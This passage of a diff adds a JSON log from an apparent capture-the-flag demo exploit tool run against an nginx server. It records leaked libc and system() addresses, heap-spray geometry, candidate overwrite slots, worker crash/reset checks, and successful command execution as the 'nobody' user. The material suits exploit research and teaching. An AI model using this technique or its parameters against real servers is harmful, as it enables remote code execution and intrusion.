+            "addr": "0x55a491956547",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3952
+          },
+          {
+            "addr": "0x55a491952f5f",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3960
+          },
+          {
+            "addr": "0x55a49195654f",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3960
+          },
+          {
+            "addr": "0x55a491952f67",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3968
+          },
+          {
+            "addr": "0x55a491956557",
+            "reason": "command does not fit at body offset",
+            "slot_offset": 3968
+          }
+        ],
+        "dropped_count": 29,
+        "kept_count": 195,
+        "payload_size": 328
+      },
+      "final_target_facts": {
+        "heap_ranges": [
+          [
+            "0x55a49189a000",
+            "0x55a4918ff000"
+          ],
+          [
+            "0x55a4918ff000",
+            "0x55a491940000"
+          ]
+        ],
+        "legacy_safe_candidates": 3,
+        "libc_base": "0x7f916f48e000",
+        "libc_path": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+        "nginx_path": "/nginx-src/build/nginx",
+        "nginx_rw_base": "0x55a48fa75000",
+        "system_addr": "0x7f916f4ded70",
+        "system_offset": "0x50d70",
+        "worker_pid": 2914,
+        "worker_uid": 65534
+      },
+      "layout_checks": {
+        "initial_to_final": [
+          {
+            "after": "0x55a48fa75000",
+            "before": "0x55a48fa75000",
+            "description": "nginx writable map",
+            "field": "nginx_rw_base",
+            "ok": true
+          },
+          {
+            "after": "/nginx-src/build/nginx",
+            "before": "/nginx-src/build/nginx",
+            "description": "nginx path",
+            "field": "nginx_path",
+            "ok": true
+          },
+          {
+            "after": "0x7f916f48e000",
+            "before": "0x7f916f48e000",
+            "description": "libc base",
+            "field": "libc_base",
+            "ok": true
+          },
+          {
+            "after": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+            "before": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+            "description": "libc path",
+            "field": "libc_path",
+            "ok": true
+          },
+          {
+            "after": "0x50d70",
+            "before": "0x50d70",
+            "description": "system offset",
+            "field": "system_offset",
+            "ok": true
+          },
+          {
+            "after": "0x7f916f4ded70",
+            "before": "0x7f916f4ded70",
+            "description": "system address",
+            "field": "system_addr",
+            "ok": true
+          },
+          {
+            "after": [
+              [
+                "0x55a49189a000",
+                "0x55a4918ff000"
+              ],
+              [
+                "0x55a4918ff000",
+                "0x55a491940000"
+              ]
+            ],
+            "before": [
+              [
+                "0x55a49189a000",
+                "0x55a4918ff000"
+              ],
+              [
+                "0x55a4918ff000",
+                "0x55a491928000"
+              ]
+            ],
+            "description": "heap ranges present",
+            "field": "heap_ranges_present",
+            "ok": true
+          }
+        ],
+        "pre_reset_to_final": [
+          {
+            "after": "0x55a48fa75000",
+            "before": "0x55a48fa75000",
+            "description": "nginx writable map",
+            "field": "nginx_rw_base",
+            "ok": true
+          },
+          {
+            "after": "/nginx-src/build/nginx",
+            "before": "/nginx-src/build/nginx",
+            "description": "nginx path",
+            "field": "nginx_path",
+            "ok": true
+          },
+          {
+            "after": "0x7f916f48e000",
+            "before": "0x7f916f48e000",
+            "description": "libc base",
+            "field": "libc_base",
+            "ok": true
+          },
+          {
+            "after": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+            "before": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+            "description": "libc path",
+            "field": "libc_path",
+            "ok": true
+          },
+          {
+            "after": "0x50d70",
+            "before": "0x50d70",
+            "description": "system offset",
+            "field": "system_offset",
+            "ok": true
+          },
+          {
+            "after": "0x7f916f4ded70",
+            "before": "0x7f916f4ded70",
+            "description": "system address",
+            "field": "system_addr",
+            "ok": true
+          },
+          {
+            "after": [
+              [
+                "0x55a49189a000",
+                "0x55a4918ff000"
+              ],
+              [
+                "0x55a4918ff000",
+                "0x55a491940000"
+              ]
+            ],
+            "before": [
+              [
+                "0x55a49189a000",
+                "0x55a4918ff000"
+              ],
+              [
+                "0x55a4918ff000",
+                "0x55a491940000"
+              ]
+            ],
+            "description": "heap ranges present",
+            "field": "heap_ranges_present",
+            "ok": true
+          }
+        ]
+      },
+      "reset_core": {
+        "cleanup_pool_count": 1,
+        "core_pids": [
+          2913
+        ],
+        "crashed": true,
+        "expected_worker_pid": 2913,
+        "geometry": {
+          "a_count": 127,
+          "plus_count": 962
+        },
+        "matches": [
+          {
+            "hit": {
+              "addr": "0x55a491955627",
+              "slot_offset": 80
+            },
+            "pool": {
+              "addr": "0x55a49195f190",
+              "cleanup": "0x55a491953030",
+              "end": "0x4232254232254232",
+              "last": "0x2542322542322542"
+            }
+          },
+          {
+            "hit": {
+              "addr": "0x55a49195562f",
+              "slot_offset": 88
+            },
+            "pool": {
+              "addr": "0x55a49195f190",
+              "cleanup": "0x55a491953030",
+              "end": "0x4232254232254232",
+              "last": "0x2542322542322542"
+            }
+          },
+          {
+            "hit": {
+              "addr": "0x55a491955637",
+              "slot_offset": 96
+            },
+            "pool": {
+              "addr": "0x55a49195f190",
+              "cleanup": "0x55a491953030",
+              "end": "0x4232254232254232",
+              "last": "0x2542322542322542"
+            }
+          },
+          {
+            "hit": {
+              "addr": "0x55a491955647",
+              "slot_offset": 112
+            },
+            "pool": {
+              "addr": "0x55a49195f190",
+              "cleanup": "0x55a491953030",
+              "end": "0x4232254232254232",
+              "last": "0x2542322542322542"
+            }
+          },
+          {
+            "hit": {
+              "addr": "0x55a49195564f",
+              "slot_offset": 120
+            },
+            "pool": {
+              "addr": "0x55a49195f190",
+              "cleanup": "0x55a491953030",
+              "end": "0x4232254232254232",
+              "last": "0x2542322542322542"
+            }
+          },
+          {
+            "hit": {
+              "addr": "0x55a491955657",
+              "slot_offset": 128
+            },
+            "pool": {
+              "addr": "0x55a49195f190",
+              "cleanup": "0x55a491953030",
+              "end": "0x4232254232254232",
+              "last": "0x2542322542322542"
+            }
+          },
+          {
+            "hit": {
+              "addr": "0x55a49195565f",
+              "slot_offset": 136
+            },
+            "pool": {
+              "addr": "0x55a49195f190",
+              "cleanup": "0x55a491953030",
+              "end": "0x4232254232254232",
+              "last": "0x2542322542322542"
+            }
+          },
+          {
+            "hit": {
+              "addr": "0x55a491955667",
+              "slot_offset": 144
+            },
+            "pool": {
+              "addr": "0x55a49195f190",
+              "cleanup": "0x55a491953030",
+              "end": "0x4232254232254232",
+              "last": "0x2542322542322542"
+            }
+          },
+          {
+            "hit": {
+              "addr": "0x55a49195566f",
+              "slot_offset": 152
+            },
+            "pool": {
+              "addr": "0x55a49195f190",
+              "cleanup": "0x55a491953030",
+              "end": "0x4232254232254232",
+              "last": "0x2542322542322542"
+            }
+          },
+          {
+            "hit": {
+              "addr": "0x55a491955677",
+              "slot_offset": 160
+            },
+            "pool": {
+              "addr": "0x55a49195f190",
+              "cleanup": "0x55a491953030",
+              "end": "0x4232254232254232",
+              "last": "0x2542322542322542"
+            }
+          },
+          {
+            "hit": {
+              "addr": "0x55a491952127",
+              "slot_offset": 320
+            },
+            "pool": {
+              "addr": "0x55a49195f190",
+              "cleanup": "0x55a491953030",
+              "end": "0x4232254232254232",
+              "last": "0x2542322542322542"
+            }
+          },
+          {
+            "hit": {
+              "addr": "0x55a49195212f",
+              "slot_offset": 328
+            },
+            "pool": {
+              "addr": "0x55a49195f190",
+              "cleanup": "0x55a491953030",
+              "end": "0x4232254232254232",
+              "last": "0x2542322542322542"
+            }
+          },
+          {
+            "hit": {
+              "addr": "0x55a491952137",
+              "slot_offset": 336
+            },
+            "pool": {
+              "addr": "0x55a49195f190",
+              "cleanup": "0x55a491953030",
+              "end": "0x4232254232254232",
+              "last": "0x2542322542322542"
+            }
+          },
+          {
+            "hit": {
+              "addr": "0x55a491955727",
+              "slot_offset": 336
+            },
+            "pool": {
+              "addr": "0x55a49195f190",
+              "cleanup": "0x55a491953030",
+              "end": "0x4232254232254232",
+              "last": "0x2542322542322542"
+            }
+          },
+          {
+            "hit": {
+              "addr": "0x55a49195572f",
+              "slot_offset": 344
+            },
+            "pool": {
+              "addr": "0x55a49195f190",
+              "cleanup": "0x55a491953030",
+              "end": "0x4232254232254232",
+              "last": "0x2542322542322542"
+            }
+          },
+          {
+            "hit": {
+              "addr": "0x55a491952147",
+              "slot_offset": 352
+            },
+            "pool": {
+              "addr": "0x55a49195f190",
+              "cleanup": "0x55a491953030",
+              "end": "0x4232254232254232",
+              "last": "0x2542322542322542"
+            }
+          },
+          {
+            "hit": {
+              "addr": "0x55a491955737",
+              "slot_offset": 352
+            },
+            "pool": {
+              "addr": "0x55a49195f190",
+              "cleanup": "0x55a491953030",
+              "end": "0x4232254232254232",
+              "last": "0x2542322542322542"
+            }
+          },
+          {
+            "hit": {
+              "addr": "0x55a49195214f",
+              "slot_offset": 360
+            },
+            "pool": {
+              "addr": "0x55a49195f190",
+              "cleanup": "0x55a491953030",
+              "end": "0x4232254232254232",
+              "last": "0x2542322542322542"
+            }
+          },
+          {
+            "hit": {
+              "addr": "0x55a491952157",
+              "slot_offset": 368
+            },
+            "pool": {
+              "addr": "0x55a49195f190",
+              "cleanup": "0x55a491953030",
+              "end": "0x4232254232254232",
+              "last": "0x2542322542322542"
+            }
+          },
+          {
+            "hit": {
+              "addr": "0x55a491955747",
+              "slot_offset": 368
+            },
+            "pool": {
+              "addr": "0x55a49195f190",
+              "cleanup": "0x55a491953030",
+              "end": "0x4232254232254232",
+              "last": "0x2542322542322542"
+            }
+          }
+        ],
+        "nonce": "3b3fe98c3f49",
+        "pid_match": true,
+        "probe_cleanup_pool_count": 1,
+        "safe_slot_count": 1028,
+        "unsafe_slot_count": 9409
+      },
+      "round": 1,
+      "selected_geometry": {
+        "a_count": 127,
+        "plus_count": 962
+      },
+      "started_at": "2026-05-15T03:30:37+00:00",
+      "status": "success",
+      "winner": {
+        "address": "0x55a491955627",
+        "attempt": 1,
+        "candidate_index": 1,
+        "command_output": "uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)",
+        "crashed": false,
+        "geometry": {
+          "a_count": 127,
+          "plus_count": 962
+        },
+        "marker_text": "uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)\n\n__NGINX_RIFT_TOKEN__=444759c49715ce004fe00a9a25d38e0e\n__NGINX_RIFT_RC__=0\n",
+        "round": 1,
+        "slot_offset": 80
+      }
+    }
+  ],
+  "selected_geometry": {
+    "a_count": 127,
+    "plus_count": 962
+  },
+  "started_at": "2026-05-15T03:30:37+00:00",
+  "status": "success",
+  "target": {
+    "host": "192.168.1.205",
+    "port": 19321
+  },
+  "target_snapshots": [
+    {
+      "heap_ranges": [
+        [
+          "0x55a49189a000",
+          "0x55a4918ff000"
+        ],
+        [
+          "0x55a4918ff000",
+          "0x55a491928000"
+        ]
+      ],
+      "label": "initial",
+      "libc_base": "0x7f916f48e000",
+      "libc_path": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+      "nginx_path": "/nginx-src/build/nginx",
+      "nginx_rw_base": "0x55a48fa75000",
+      "system_addr": "0x7f916f4ded70",
+      "system_offset": "0x50d70",
+      "worker_pid": 2912,
+      "worker_uid": 65534
+    },
+    {
+      "heap_ranges": [
+        [
+          "0x55a49189a000",
+          "0x55a4918ff000"
+        ],
+        [
+          "0x55a4918ff000",
+          "0x55a491940000"
+        ]
+      ],
+      "label": "round_1_pre_probe_1",
+      "libc_base": "0x7f916f48e000",
+      "libc_path": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+      "nginx_path": "/nginx-src/build/nginx",
+      "nginx_rw_base": "0x55a48fa75000",
+      "system_addr": "0x7f916f4ded70",
+      "system_offset": "0x50d70",
+      "worker_pid": 2912,
+      "worker_uid": 65534
+    },
+    {
+      "heap_ranges": [
+        [
+          "0x55a49189a000",
+          "0x55a4918ff000"
+        ],
+        [
+          "0x55a4918ff000",
+          "0x55a491940000"
+        ]
+      ],
+      "label": "round_1_pre_reset",
+      "libc_base": "0x7f916f48e000",
+      "libc_path": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+      "nginx_path": "/nginx-src/build/nginx",
+      "nginx_rw_base": "0x55a48fa75000",
+      "system_addr": "0x7f916f4ded70",
+      "system_offset": "0x50d70",
+      "worker_pid": 2913,
+      "worker_uid": 65534
+    },
+    {
+      "heap_ranges": [
+        [
+          "0x55a49189a000",
+          "0x55a4918ff000"
+        ],
+        [
+          "0x55a4918ff000",
+          "0x55a491940000"
+        ]
+      ],
+      "label": "round_1_final",
+      "libc_base": "0x7f916f48e000",
+      "libc_path": "/usr/lib/x86_64-linux-gnu/libc.so.6",
+      "nginx_path": "/nginx-src/build/nginx",
+      "nginx_rw_base": "0x55a48fa75000",
+      "system_addr": "0x7f916f4ded70",
+      "system_offset": "0x50d70",
+      "worker_pid": 2914,
+      "worker_uid": 65534
+    }
+  ],
+  "tool": "demo_ctf_exploit_v1_6.py",
+  "winner": {
+    "address": "0x55a491955627",
+    "attempt": 1,
+    "candidate_index": 1,
+    "command_output": "uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)",
+    "crashed": false,
+    "geometry": {
+      "a_count": 127,
+      "plus_count": 962
+    },
+    "marker_text": "uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)\n\n__NGINX_RIFT_TOKEN__=444759c49715ce004fe00a9a25d38e0e\n__NGINX_RIFT_RC__=0\n",
+    "round": 1,
+    "slot_offset": 80
+  }
+}
